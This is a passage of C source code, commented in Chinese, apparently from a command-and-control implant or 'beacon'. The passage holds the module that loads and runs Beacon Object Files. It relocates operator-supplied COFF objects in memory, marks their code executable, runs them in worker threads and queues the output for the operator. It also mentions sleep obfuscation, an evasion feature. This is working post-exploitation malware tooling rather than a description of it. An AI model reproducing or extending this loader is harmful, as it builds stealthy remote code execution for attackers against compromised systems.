                    /* 外部函数绝对地址（写入 GOT） */
                    *(PVOID*)func_map_addr = function_ptr;
                    Offset = (UINT32)(ULONG_PTR)func_map_addr;
                    *(PUINT32)reloc_addr = Offset;
                    number_of_func++;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_DIR32 && bss_addr != 0) {
                    /* BSS 绝对地址 */
                    Offset = (UINT32)bss_addr;
                    *(PUINT32)reloc_addr = Offset;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_DIR32 &&
                           ((coff_symbol->StorageClass == IMAGE_SYM_CLASS_STATIC &&
                             coff_symbol->Value != 0) ||
                            (coff_symbol->StorageClass == IMAGE_SYM_CLASS_EXTERNAL &&
                             coff_symbol->SectionNumber != 0x0))) {
                    /* 节区内静态符号绝对地址 */
                    Offset = coff_symbol->Value;
                    Offset += (ULONG_PTR)symbol_sec_addr;
                    *(PUINT32)reloc_addr = Offset;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_DIR32 &&
                           function_ptr == NULL && symbol_sec_addr != NULL) {
                    /* 节区内符号绝对地址 */
                    Offset = *(PUINT32)(reloc_addr);
                    Offset += (ULONG_PTR)symbol_sec_addr;
                    *(PUINT32)reloc_addr = Offset;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_DIR32NB && function_ptr != NULL) {
                    /* 外部函数 ImageBase 相对偏移 */
                    *(PVOID*)func_map_addr = function_ptr;
                    Offset = (UINT32)((ULONG_PTR)func_map_addr - (ULONG_PTR)pCoffee->ImageBase);
                    *(PUINT32)reloc_addr = Offset;
                    number_of_func++;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_DIR32NB && bss_addr != 0) {
                    /* BSS ImageBase 相对偏移 */
                    Offset = (UINT32)(bss_addr - (ULONG_PTR)pCoffee->ImageBase);
                    *(PUINT32)reloc_addr = Offset;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_DIR32NB &&
                           ((coff_symbol->StorageClass == IMAGE_SYM_CLASS_STATIC &&
                             coff_symbol->Value != 0) ||
                            (coff_symbol->StorageClass == IMAGE_SYM_CLASS_EXTERNAL &&
                             coff_symbol->SectionNumber != 0x0))) {
                    /* 节区内静态符号 ImageBase 相对偏移 */
                    Offset = coff_symbol->Value;
                    Offset += (ULONG_PTR)symbol_sec_addr - (ULONG_PTR)pCoffee->ImageBase;
                    *(PUINT32)reloc_addr = Offset;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_DIR32NB &&
                           function_ptr == NULL && symbol_sec_addr != NULL) {
                    /* 节区内符号 ImageBase 相对偏移 */
                    Offset = *(PUINT32)(reloc_addr);
                    Offset += (ULONG_PTR)symbol_sec_addr - (ULONG_PTR)pCoffee->ImageBase;
                    *(PUINT32)reloc_addr = Offset;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_SECTION &&
                           symbol_sec_addr != NULL) {
                    /* 节区号写入 */
                    *(PUINT16)reloc_addr = coff_symbol->SectionNumber;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_SECREL &&
                           symbol_sec_addr != NULL) {
                    /* 节区内偏移 */
                    *(PUINT32)reloc_addr = coff_symbol->Value;

                } else if (pCoffee->Reloc->Type != IMAGE_REL_I386_ABSOLUTE) {
                    /* 不支持的重定位类型 */
                    return FALSE;
                }
            }
#endif
            pCoffee->Reloc = (PCOFF_RELOC)((ULONG_PTR)pCoffee->Reloc + sizeof(COFF_RELOC));
        }
    }

    return TRUE;
}

/* 给 x64 BOF 注册 .pdata/.xdata 异常展开表 */
#if _WIN64
static BOOL BofRegisterFunctionTable(BeaconContext* ctx, PCOFFEE pCoffee,
                                     PRUNTIME_FUNCTION* functionTable)
{
    HMODULE ntdll;
    BofRtlAddFunctionTable addFunctionTable;
    DWORD sec;
    DWORD count;

    if (functionTable) {
        *functionTable = NULL;
    }
    if (!ctx || !pCoffee || !functionTable ||
        !ctx->api.pfnGetModuleHandleA || !ctx->api.pfnGetProcAddress) {
        return TRUE;
    }

    for (sec = 0; sec < pCoffee->Header->NumberOfSections; ++sec) {
        pCoffee->Section = (PCOFF_SECTION)((ULONG_PTR)pCoffee->Data +
            sizeof(COFF_FILE_HEADER) + (ULONG_PTR)(sizeof(COFF_SECTION) * sec));
        if (memcmp(pCoffee->Section->Name, ".pdata", 6) == 0 &&
            pCoffee->SecMap[sec].Size >= sizeof(RUNTIME_FUNCTION)) {
            ntdll = (HMODULE)ctx->api.pfnGetModuleHandleA("ntdll.dll");
            if (!ntdll) {
                return FALSE;
            }

            addFunctionTable = (BofRtlAddFunctionTable)
                ctx->api.pfnGetProcAddress(ntdll, "RtlAddFunctionTable");
            if (!addFunctionTable) {
                return FALSE;
            }

            count = (DWORD)(pCoffee->SecMap[sec].Size / sizeof(RUNTIME_FUNCTION));
            if (!addFunctionTable((PRUNTIME_FUNCTION)pCoffee->SecMap[sec].Ptr,
                                  count,
                                  (DWORD64)pCoffee->ImageBase)) {
                return FALSE;
            }

            *functionTable = (PRUNTIME_FUNCTION)pCoffee->SecMap[sec].Ptr;
            return TRUE;
        }
    }

    return TRUE;
}

static VOID BofUnregisterFunctionTable(BeaconContext* ctx, PRUNTIME_FUNCTION functionTable)
{
    HMODULE ntdll;
    BofRtlDeleteFunctionTable deleteFunctionTable;

    if (!ctx || !functionTable ||
        !ctx->api.pfnGetModuleHandleA || !ctx->api.pfnGetProcAddress) {
        return;
    }

    ntdll = (HMODULE)ctx->api.pfnGetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        return;
    }

    deleteFunctionTable = (BofRtlDeleteFunctionTable)
        ctx->api.pfnGetProcAddress(ntdll, "RtlDeleteFunctionTable");
    if (deleteFunctionTable) {
        deleteFunctionTable(functionTable);
    }
}
#endif

/* ===== BOF 入口线程执行 ===== */

typedef VOID (__cdecl *BOF_ENTRY)(PCHAR, DWORD);

typedef struct BofEntryCall {
    BofJobRuntime* runtime;
    PVOID entry_point;
    PVOID argument;
    DWORD argument_size;
} BofEntryCall;

/* 存储 BOF 入口线程信息到运行时结构 */
static VOID BofRuntimeStoreThread(BofJobRuntime* runtime, HANDLE hThread, DWORD threadId)
{
    if (!runtime) return;

    EnterCriticalSection(&runtime->lock);
    runtime->entry_thread    = hThread;
    runtime->entry_thread_id = threadId;
    InterlockedExchange(&runtime->entry_started, 1);
    LeaveCriticalSection(&runtime->lock);
}

/* 关闭并清理 BOF 入口线程句柄 */
static VOID BofRuntimeCloseEntryThread(BofJobRuntime* runtime)
{
    HANDLE hThread = NULL;

    if (!runtime) return;

    EnterCriticalSection(&runtime->lock);
    hThread = runtime->entry_thread;
    runtime->entry_thread    = NULL;
    runtime->entry_thread_id = 0;
    LeaveCriticalSection(&runtime->lock);

    if (hThread) {
        CloseHandle(hThread);
    }
}

/* 释放 BOF 运行时结构（清零后释放） */
static VOID BofRuntimeFree(BofJobRuntime* runtime)
{
    if (!runtime) return;

    BofRuntimeUnregister(runtime);
    BofRuntimeCloseEntryThread(runtime);
    if (runtime->bss_entries) {
        SecureZeroMemory(runtime->bss_entries,
                         (SIZE_T)runtime->bss_entry_capacity * sizeof(BSSEntry));
        HeapFree(GetProcessHeap(), 0, runtime->bss_entries);
        runtime->bss_entries = NULL;
    }
    DeleteCriticalSection(&runtime->lock);
    SecureZeroMemory(runtime, sizeof(*runtime));
    HeapFree(GetProcessHeap(), 0, runtime);
}

static LONG BofEntryExceptionFilter(BofJobRuntime* runtime, PEXCEPTION_POINTERS exceptionInfo)
{
    if (runtime && exceptionInfo &&
        InterlockedCompareExchange(&runtime->exception_seen, 1, 0) == 0) {
        runtime->exception_code =
            exceptionInfo->ExceptionRecord->ExceptionCode;
        runtime->exception_address =
            exceptionInfo->ExceptionRecord->ExceptionAddress;
    }

    return EXCEPTION_EXECUTE_HANDLER;
}

static DWORD WINAPI BofEntryThreadProc(PVOID param)
{
    BofEntryCall* call = (BofEntryCall*)param;
    BofJobRuntime* runtime;
    BOF_ENTRY entry;

    if (!call || !call->runtime || !call->entry_point) return 1;

    runtime = call->runtime;
    entry = (BOF_ENTRY)call->entry_point;

    BofRuntimeSetCurrent(runtime);
    __try {
        entry((PCHAR)call->argument, call->argument_size);
    } __except (BofEntryExceptionFilter(runtime, GetExceptionInformation())) {
    }
    BofRuntimeSetCurrent(NULL);

    return 0;
}

/* 通过包装线程调用 BOF 入口，以便设置动态 TLS 并保留父线程清理能力。 */
static BOOL BofHitEntryPoint(BeaconContext* ctx, BofJobRuntime* runtime,
                             PVOID pvEntryPoint, PVOID pvArgument, DWORD dwArgSize)
{
    BofEntryCall* call = NULL;
    HANDLE hThread = NULL;
    DWORD threadId = 0;
    DWORD waitResult;

    if (!ctx || !runtime || !pvEntryPoint ||
        !ctx->api.pfnCreateThread || !ctx->api.pfnWaitForSingleObject) {
        BofSetError(runtime, "missing BOF entry thread API");
        return FALSE;
    }

    if (!BofRuntimeEnsureInit()) {
        BofSetError(runtime, "failed to initialize BOF runtime TLS");
        return FALSE;
    }

    call = (BofEntryCall*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*call));
    if (!call) {
        BofSetError(runtime, "failed to allocate BOF entry call");
        return FALSE;
    }

    call->runtime = runtime;
    call->entry_point = pvEntryPoint;
    call->argument = pvArgument;
    call->argument_size = dwArgSize;

    hThread = ctx->api.pfnCreateThread(NULL, 0, BofEntryThreadProc, call, 0, &threadId);
    if (!hThread) {
        HeapFree(GetProcessHeap(), 0, call);
        BofSetError(runtime, "failed to start BOF entry thread");
        return FALSE;
    }

    BofRuntimeStoreThread(runtime, hThread, threadId);
    for (;;) {
        waitResult = ctx->api.pfnWaitForSingleObject(hThread, 250);
        if (waitResult == WAIT_OBJECT_0) {
            break;
        }
        if (waitResult != WAIT_TIMEOUT) {
            BofSetError(runtime, "failed waiting for BOF entry thread: 0x%08lX", waitResult);
            break;
        }
        if ((runtime->stop_event &&
             ctx->api.pfnWaitForSingleObject(runtime->stop_event, 0) == WAIT_OBJECT_0) ||
            JobIsCancelRequested(runtime->job)) {
            /* BOF 仅支持协作取消；继续等待入口线程自行返回。 */
        }
    }

    InterlockedExchange(&runtime->entry_done, 1);
    HeapFree(GetProcessHeap(), 0, call);

    if (waitResult != WAIT_OBJECT_0) {
        if (!runtime->last_error[0]) {
            BofSetError(runtime, "failed waiting for BOF entry thread: 0x%08lX", waitResult);
        }
        return FALSE;
    }

    return TRUE;
}

/* ===== BOF 执行入口 ===== */

/* 查找入口点、设置 .text 段可执行、执行 BOF */
static BOOL BofRun(BeaconContext* ctx, BofJobRuntime* runtime, PCOFFEE pCoffee, PCHAR szEntryPoint,
                   PVOID pvArgument, DWORD dwArgSize)
{
    DWORD cnt = 0;
    PVOID entry_point = NULL;
    SIZE_T secSize = 0;
    ULONG oldProtect = 0;
    BOOL ok = FALSE;

    /* 在符号表中查找入口函数 */
    for (cnt = 0; cnt < pCoffee->Header->NumberOfSymbols; cnt++) {
        if (memcmp(pCoffee->Symbol[cnt].First.Name, szEntryPoint, BofStrLen(szEntryPoint)) == 0) {
            entry_point = (PVOID)(pCoffee->SecMap[pCoffee->Symbol[cnt].SectionNumber - 1].Ptr +
                pCoffee->Symbol[cnt].Value);
            break;
        }
    }

    if (!entry_point) {
        BofSetError(runtime, "entry point not found: %s", szEntryPoint ? szEntryPoint : "(null)");
        return FALSE;
    }

    /* 将所有 .text* 段设置为可执行。MSVC BOF 常会生成多个 .text$mn COMDAT 段。 */
    for (cnt = 0; cnt < pCoffee->Header->NumberOfSections; cnt++) {
        pCoffee->Section = (PCOFF_SECTION)((ULONG_PTR)pCoffee->Data +
            sizeof(COFF_FILE_HEADER) + (ULONG_PTR)(sizeof(COFF_SECTION) * cnt));
        if (BofHashString(pCoffee->Section->Name, COFF_PREP_TEXT_SIZE, FALSE) == COFF_PREP_TEXT) {
            secSize = pCoffee->SecMap[cnt].Size;
            if (secSize != 0 &&
                ctx->api.pfnNtProtectVirtualMemory((HANDLE)-1, &pCoffee->SecMap[cnt].Ptr,
                    &secSize, PAGE_EXECUTE_READ, &oldProtect) != 0) {
                BofSetError(runtime, "failed to protect BOF .text");
                return FALSE;
            }
        }
    }

    /* 执行 BOF 入口线程，异常状态记录在 per-job runtime 中。 */
    InterlockedExchange(&runtime->exception_seen, 0);
    runtime->exception_code = 0;
    runtime->exception_address = NULL;
    ok = BofHitEntryPoint(ctx, runtime, entry_point, pvArgument, dwArgSize);

    if (!ok) {
        return FALSE;
    }
    if (InterlockedCompareExchange(&runtime->exception_seen, 0, 0) != 0) {
        BofSetError(runtime, "entry raised exception 0x%08lX at %p",
                    runtime->exception_code, runtime->exception_address);
        return FALSE;
    }

    return TRUE;
}

/* ===== 主执行函数 ===== */

/* 完整的 BOF 加载→重定位→执行流程 */
static PacketList CommandBofExecute(BeaconContext* ctx, UINT32 task_id, Parser* p,
                                    BofJobRuntime* runtime)
{
    PacketList out;
    ByteBuf result;
    CHAR entry_name[256] = { 0 };
    PVOID bof_buffer = NULL;
    PVOID args_buffer = NULL;
    DWORD bof_size = 0;
    DWORD args_size = 0;
    PVOID next_base = NULL;
    PCOFFEE coffee = NULL;
    DWORD sec;
    CHAR validateReason[64] = { 0 };
#if _WIN64
    PRUNTIME_FUNCTION functionTable = NULL;
#endif

    PlistInit(&out);
    BbInit(&result);
    (VOID)task_id;

    if (!ctx || !p) {
        BbPrintf(&result, "BOF: invalid parameters");
        PlistAdd(&out, result);
        return out;
    }

    if (!runtime) {
        BbPrintf(&result, "BOF: missing runtime");
        PlistAdd(&out, result);
        return out;
    }

    runtime->last_error[0] = '\0';

    /* 延迟初始化 LdrApi 表 */
    BofInitLdrApi(runtime, ctx);

    /* 解析 payload */
    if (!BofParsePayload(p, entry_name, sizeof(entry_name),
                         &bof_buffer, &bof_size, &args_buffer, &args_size)) {
        BbPrintf(&result, "BOF: failed to parse payload");
        PlistAdd(&out, result);
        return out;
    }

    /* 分配 COFFEE 结构 */
    coffee = (PCOFFEE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COFFEE));
    if (!coffee) {
        BbPrintf(&result, "BOF: failed to allocate COFFEE");
        PlistAdd(&out, result);
        BOFSECUREFREE(bof_buffer, bof_size);
        BOFSECUREFREE(args_buffer, args_size);
        return out;
    }

    coffee->Data   = bof_buffer;
    coffee->Header = (PCOFF_FILE_HEADER)coffee->Data;

    /* 验证 COFF 文件完整性 */
    if (!BofValidateCoff(coffee, bof_size, validateReason, sizeof(validateReason))) {
        BbPrintf(&result, "BOF: invalid COFF: %s", validateReason);
        PlistAdd(&out, result);
        goto cleanup;
    }

    coffee->Symbol = (PCOFF_SYMBOL)((ULONG_PTR)coffee->Data +
        coffee->Header->PointerToSymbolTable);
    coffee->SecMap = (PSECTION_MAP)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
        coffee->Header->NumberOfSections * sizeof(SECTION_MAP));

    /* 验证架构匹配 */
#ifdef _WIN64
    if (coffee->Header->Machine != IMAGE_FILE_MACHINE_AMD64) {
        BbPrintf(&result, "BOF: architecture mismatch, x64 beacon requires AMD64 COFF, got 0x%04X",
                 coffee->Header->Machine);
        PlistAdd(&out, result);
        goto cleanup;
    }
#else
    if (coffee->Header->Machine != IMAGE_FILE_MACHINE_I386) {
        BbPrintf(&result, "BOF: architecture mismatch, x86 beacon requires I386 COFF, got 0x%04X",
                 coffee->Header->Machine);
        PlistAdd(&out, result);
        goto cleanup;
    }
#endif

    /* 计算 BOF 总大小和 GOT/BSS 大小 */
    coffee->GOTSize = BofParseTotalSize(runtime, coffee, &coffee->BofSize, &coffee->BSSSize);

    /* 分配 BOF 映射内存 */
    coffee->ImageBase = BofAllocateImageMemory(ctx, (DWORD)coffee->BofSize);
    if (!coffee->ImageBase) {
        BbPrintf(&result, "BOF: failed to allocate memory");
        PlistAdd(&out, result);
        goto cleanup;
    }

    /* 映射节区到分配的内存 */
    next_base = coffee->ImageBase;
    for (sec = 0; sec < coffee->Header->NumberOfSections; sec++) {
        coffee->Section = (PCOFF_SECTION)((ULONG_PTR)coffee->Data +
            sizeof(COFF_FILE_HEADER) + (ULONG_PTR)(sizeof(COFF_SECTION) * sec));
        coffee->SecMap[sec].Size = coffee->Section->SizeOfRawData;
        coffee->SecMap[sec].Ptr  = (PCHAR)next_base;

        next_base = (PVOID)((ULONG_PTR)next_base + coffee->Section->SizeOfRawData);
        next_base = (PVOID)PAGE_ALLIGN(next_base);

        if (coffee->Section->PointerToRawData != 0 &&
            !(coffee->Section->Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA)) {
            memcpy(coffee->SecMap[sec].Ptr,
                   (PVOID)((ULONG_PTR)coffee->Data + coffee->Section->PointerToRawData),
                   coffee->Section->SizeOfRawData);
        }
    }

    /* 设置 GOT 和 BSS 指针 */
    coffee->GOT = (PULONG_PTR)next_base;
    coffee->BSS = (PVOID)((ULONG_PTR)next_base + coffee->GOTSize);

    /* 初始化当前 BOF 的 BSS 条目表 */
    if (runtime->bss_entry_capacity) {
        runtime->bss_entries = (BSSEntry*)HeapAlloc(
            GetProcessHeap(), HEAP_ZERO_MEMORY,
            (SIZE_T)runtime->bss_entry_capacity * sizeof(BSSEntry));
        if (!runtime->bss_entries) {
            BbPrintf(&result, "BOF: failed to allocate BSS entry table");
            PlistAdd(&out, result);
            goto cleanup;
        }
    }

    /* 处理所有重定位 */
    if (!BofProcessSection(ctx, runtime, coffee)) {
        if (runtime->last_error[0]) {
            BbPrintf(&result, "BOF: relocation processing failed: %s", runtime->last_error);
        } else {
            BbPrintf(&result, "BOF: relocation processing failed");
        }
        PlistAdd(&out, result);
        goto cleanup;
    }

#if _WIN64
    /* 为 x64 BOF 注册函数表，以支持异常展开。BOF 入口线程内的任何异常都会被捕获并记录在运行时结构中。 */
    if (!BofRegisterFunctionTable(ctx, coffee, &functionTable)) {
        BbPrintf(&result, "BOF: failed to register x64 function table");
        PlistAdd(&out, result);
        goto cleanup;
    }
#endif

    /* 检查是否已被取消 */
    if (runtime && JobIsCancelRequested(runtime->job)) {
        BbPrintf(&result, "BOF: canceled before entry");
        PlistAdd(&out, result);
        goto cleanup;
    }

    /* 执行 BOF */
    BofRuntimeRegister(runtime, coffee->ImageBase, coffee->BofSize);
    if (!BofRun(ctx, runtime, coffee, entry_name, args_buffer, args_size)) {
        if (runtime && JobIsCancelRequested(runtime->job)) {
            goto cleanup;
        }
        if (runtime->last_error[0]) {
            BbPrintf(&result, "BOF: execution failed: %s", runtime->last_error);
        } else {
            BbPrintf(&result, "BOF: execution failed");
        }
        PlistAdd(&out, result);
    }

cleanup:
    BofRuntimeUnregister(runtime);
#if _WIN64
    if (functionTable) {
        BofUnregisterFunctionTable(ctx, functionTable);
    }
#endif

    /* 安全释放所有资源 */
    if (coffee) {
        if (coffee->ImageBase)
            ctx->api.pfnVirtualFree(coffee->ImageBase, 0, MEM_RELEASE);
        if (coffee->SecMap)
            BOFSECUREFREE(coffee->SecMap, coffee->Header->NumberOfSections * sizeof(SECTION_MAP));
        BOFSECUREFREE(coffee, sizeof(COFFEE));
    }
    if (bof_buffer)  BOFSECUREFREE(bof_buffer, bof_size);
    if (args_buffer) BOFSECUREFREE(args_buffer, args_size);

    return out;
}

/* ===== BOF Job 线程参数 ===== */

typedef struct BofJobArgs {
    BeaconContext* ctx;
    BeaconJob* job;
    BofJobRuntime* runtime;
    ByteBuf payload;
} BofJobArgs;

/* BOF Job 工作线程：执行 BOF 并将结果发送到 Outbox */
static DWORD WINAPI BofJobThread(PVOID param)
{
    BofJobArgs* args = (BofJobArgs*)param;
    PacketList results;
    Parser parser;
    SIZE_T i;

    if (!args || !args->ctx || !args->job) return 0;

    PlistInit(&results);

    /* 检查是否在启动前已被取消 */
    if (JobIsCancelRequested(args->job)) {
        ByteBuf msg;
        BbInit(&msg);
        BbPrintf(&msg, "BOF job %lu canceled before start", (unsigned long)args->job->task_id);
        JobEnqueueResult(args->ctx, args->job->task_id, args->job->command_id, &msg);
        BbFree(&msg);
    } else {
        /* 执行 BOF */
        ParserInit(&parser, args->payload.data, args->payload.len);
        results = CommandBofExecute(args->ctx, args->job->task_id, &parser, args->runtime);

        /* 将结果包发送到 Outbox */
        for (i = 0; i < results.count; i++) {
            if (results.items_are_final) {
                ByteBuf moved = results.items[i];
                BbInit(&results.items[i]);
                OutboxEnqueue(&args->ctx->outbox, moved);
            } else {
                JobEnqueueResult(args->ctx, args->job->task_id,
                                 args->job->command_id, &results.items[i]);
            }
        }
    }

    /* 清理并完成 Job */
    PlistFree(&results);
    BbFree(&args->payload);
    RuntimeActivityEnd(args->ctx);
    JobComplete(args->job);
    BofRuntimeFree(args->runtime);
    HeapFree(GetProcessHeap(), 0, args);

    return 0;
}

/* ===== BOF 命令入口（从 dispatcher 调用） ===== */

/* 创建 BOF Job，启动工作线程，返回启动状态 */
PacketList CommandBofHandle(BeaconContext* ctx, UINT32 task_id, Parser* p)
{
    PacketList out;
    BofJobArgs* args = NULL;
    BofJobRuntime* runtime = NULL;
    BeaconJob* job = NULL;
    SIZE_T left;
    ByteBuf msg;

    PlistInit(&out);

    if (!ctx || !p) {
        PlistAdd(&out, BbFromText("BOF: invalid parameters"));
        return out;
    }

    /* 检查 sleep 混淆是否正在进行 */
    if (!RuntimeActivityBegin(ctx)) {
        PlistAdd(&out, BbFromText("BOF: blocked while sleep obfuscation is active"));
        return out;
    }

    /* 创建 Job */
    job = JobCreate(ctx, task_id, 70u, JOB_TYPE_BOF, "bof");
    if (!job) {
        RuntimeActivityEnd(ctx);
        PlistAdd(&out, BbFromText("BOF: failed to create job"));
        return out;
    }

    /* 分配运行时结构 */
    runtime = (BofJobRuntime*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*runtime));
    if (!runtime) {
        JobComplete(job);
        RuntimeActivityEnd(ctx);
        PlistAdd(&out, BbFromText("BOF: failed to allocate runtime"));
        return out;
    }

    InitializeCriticalSection(&runtime->lock);
    runtime->ctx        = ctx;
    runtime->job        = job;
    runtime->stop_event = job->cancel_event;

    /* 分配线程参数 */
    args = (BofJobArgs*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*args));
    if (!args) {
        JobComplete(job);
        BofRuntimeFree(runtime);
        RuntimeActivityEnd(ctx);
        PlistAdd(&out, BbFromText("BOF: failed to allocate job args"));
        return out;
    }

    args->ctx      = ctx;
    args->job      = job;
    args->runtime  = runtime;
    BbInit(&args->payload);

    /* 复制剩余 payload 到线程参数 */
    left = ParserLeft(p);
    if (left && !BbAppend(&args->payload, p->data + p->off, left)) {
        BbFree(&args->payload);
        HeapFree(GetProcessHeap(), 0, args);
        JobComplete(job);
        BofRuntimeFree(runtime);
        RuntimeActivityEnd(ctx);
        PlistAdd(&out, BbFromText("BOF: failed to copy job payload"));
        return out;
    }

    /* 启动工作线程 */
    if (!JobStartThread(job, BofJobThread, args)) {
        BbFree(&args->payload);
        HeapFree(GetProcessHeap(), 0, args);
        JobComplete(job);
        BofRuntimeFree(runtime);
        RuntimeActivityEnd(ctx);
        PlistAdd(&out, BbFromText("BOF: failed to start job thread"));
        return out;
    }

    /* 返回启动成功消息 */
    BbInit(&msg);
    BbPrintf(&msg, "BOF job %lu started", (unsigned long)task_id);
    PlistAdd(&out, msg);

    return out;
}
